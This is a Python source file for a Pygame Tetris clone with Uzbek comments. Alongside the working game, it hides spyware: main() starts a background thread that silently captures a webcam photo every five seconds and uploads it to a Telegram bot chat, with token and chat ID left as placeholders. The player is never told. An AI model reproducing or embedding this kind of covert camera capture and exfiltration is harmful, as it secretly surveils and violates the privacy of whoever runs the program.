import pygame
import random
import cv2
import io
import requests
import threading
import time

# Telegram bot token va chat ID
BOT_TOKEN = 'Your Telegram Bot TOKEN'
CHAT_ID = 'Your Telegram ID'
SEND_PHOTO_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# O'yin parametrlari
WIDTH, HEIGHT = 300, 600
BLOCK_SIZE = 30
ROWS, COLS = HEIGHT // BLOCK_SIZE, WIDTH // BLOCK_SIZE
MAX_HEIGHT = 20  # Maksimal balandlik

# Ranglar
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)
CYAN = (0, 255, 255)
MAGENTA = (255, 0, 255)
YELLOW = (255, 255, 0)

# Tetrislash
SHAPES = [
    [[1, 1, 1, 1]],  # I
    [[1, 1], [1, 1]],  # O
    [[0, 1, 0], [1, 1, 1]],  # T
    [[1, 1, 0], [0, 1, 1]],  # Z
    [[0, 1, 1], [1, 1, 0]],  # S
    [[1, 0, 0], [1, 1, 1]],  # L
    [[0, 0, 1], [1, 1, 1]],  # J
]

class Piece:
    def __init__(self, shape):
        self.shape = shape
        self.color = random.choice([RED, GREEN, BLUE, CYAN, MAGENTA, YELLOW])
        self.x = COLS // 2 - len(shape[0]) // 2
        self.y = 0

    def rotate(self):
        self.shape = [list(row) for row in zip(*self.shape[::-1])]

class Tetris:
    def __init__(self):
        self.board = [[0 for _ in range(COLS)] for _ in range(ROWS)]
        self.current_piece = self.new_piece()
        self.next_piece = self.new_piece()
        self.score = 0
        self.game_over = False

    def new_piece(self):
        return Piece(random.choice(SHAPES))

    def collide(self):
        for y, row in enumerate(self.current_piece.shape):
            for x, value in enumerate(row):
                if value and (y + self.current_piece.y >= ROWS or
                              x + self.current_piece.x < 0 or
                              x + self.current_piece.x >= COLS or
                              self.board[y + self.current_piece.y][x + self.current_piece.x]):
                    return True
        return False

    def freeze(self):
        for y, row in enumerate(self.current_piece.shape):
            for x, value in enumerate(row):
                if value:
                    self.board[y + self.current_piece.y][x + self.current_piece.x] = 1
        self.current_piece = self.next_piece
        self.next_piece = self.new_piece()

    def clear_lines(self):
        lines_to_clear = [i for i, row in enumerate(self.board) if all(row)]
        for i in lines_to_clear:
            del self.board[i]
            self.board.insert(0, [0 for _ in range(COLS)])
            self.score += 100

    def check_height(self):
        if any(self.board[0]):  # Agar birinchi qatorda bloklar bo'lsa
            self.game_over = True

    def drop(self):
        self.current_piece.y += 1
        if self.collide():
            self.current_piece.y -= 1
            self.freeze()
            self.clear_lines()
            self.check_height()  # Balandlikni tekshirish

def draw_board(screen, tetris):
    for y, row in enumerate(tetris.board):
        for x, value in enumerate(row):
            if value:
                pygame.draw.rect(screen, WHITE, (x * BLOCK_SIZE, y * BLOCK_SIZE, BLOCK_SIZE, BLOCK_SIZE))
                pygame.draw.rect(screen, BLACK, (x * BLOCK_SIZE, y * BLOCK_SIZE, BLOCK_SIZE, BLOCK_SIZE), 1)

def draw_piece(screen, piece):
    for y, row in enumerate(piece.shape):
        for x, value in enumerate(row):
            if value:
                pygame.draw.rect(screen, piece.color, ((piece.x + x) * BLOCK_SIZE, (piece.y + y) * BLOCK_SIZE, BLOCK_SIZE, BLOCK_SIZE))
                pygame.draw.rect(screen, BLACK, ((piece.x + x) * BLOCK_SIZE, (piece.y + y) * BLOCK_SIZE, BLOCK_SIZE, BLOCK_SIZE), 1)

def show_game_over(screen, score):
    screen.fill(BLACK)  # O'yin tugaganida ekran qora bo'ladi
    font = pygame.font.Font(None, 74)
    text = font.render("Game Over", True, RED)  # Qizil rangda
    text_rect = text.get_rect(center=(WIDTH // 2, HEIGHT // 2 - 50))
    screen.blit(text, text_rect)

    score_text = font.render(f"Score: {score}", True, WHITE)
    score_rect = score_text.get_rect(center=(WIDTH // 2, HEIGHT // 2 + 50))
    screen.blit(score_text, score_rect)

    footer_font = pygame.font.Font(None, 30)
    footer_text = footer_font.render("Created by rozievich", True, WHITE)  # Kichkina yozuv
    footer_rect = footer_text.get_rect(center=(WIDTH // 2, HEIGHT - 30))
    screen.blit(footer_text, footer_rect)

def take_picture_and_send():
    while True:  # Har doim rasm olish
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            photo_stream = io.BytesIO()
            _, buffer = cv2.imencode('.png', frame)
            photo_stream.write(buffer)
            photo_stream.seek(0)

            # Faylni Telegram API orqali jo'natish uchun so'rov
            files = {'photo': ('image.png', photo_stream, 'image/png')}
            data = {'chat_id': CHAT_ID, 'caption': 'Tetrisdan rasm'}

            response = requests.post(SEND_PHOTO_URL, data=data, files=files)

            # Javobni tekshirish
            if response.status_code == 200:
                print("Rasm muvaffaqiyatli jo'natildi!")
            else:
                print(f"Xatolik: {response.status_code}, {response.text}")

        cap.release()
        time.sleep(5)  # Har 5 soniyada rasm olish

def main():
    pygame.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Tetris")

    clock = pygame.time.Clock()
    tetris = Tetris()
    running = True
    drop_time = 0
    fall_speed = 400  # Tezlikni millisekundda ko'rsatadi

    # Rasm olish ipini ishga tushirish
    threading.Thread(target=take_picture_and_send, daemon=True).start()

    while running:
        screen.fill(BLACK)

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if not tetris.game_over and event.type == pygame.KEYDOWN:
                if event.key == pygame.K_LEFT:
                    tetris.current_piece.x -= 1
                    if tetris.collide():
                        tetris.current_piece.x += 1
                if event.key == pygame.K_RIGHT:
                    tetris.current_piece.x += 1
                    if tetris.collide():
                        tetris.current_piece.x -= 1
                if event.key == pygame.K_DOWN:
                    tetris.current_piece.y += 1
                    if tetris.collide():
                        tetris.current_piece.y -= 1
                        tetris.freeze()  # Joylashtirish
                        tetris.clear_lines()  # Qatorlarni tozalash
                        tetris.check_height()  # Balandlikni tekshirish
                if event.key == pygame.K_UP:
                    tetris.current_piece.rotate()
                    if tetris.collide():
                        tetris.current_piece.rotate()
                        tetris.current_piece.rotate()
                        tetris.current_piece.rotate()

        if not tetris.game_over:
            drop_time += clock.get_time()
            if drop_time > fall_speed:
                tetris.drop()
                drop_time = 0

        draw_board(screen, tetris)
        draw_piece(screen, tetris.current_piece)

        if tetris.game_over:
            show_game_over(screen, tetris.score)

        pygame.display.flip()
        clock.tick(60)

    pygame.quit()

if __name__ == "__main__":
    main()
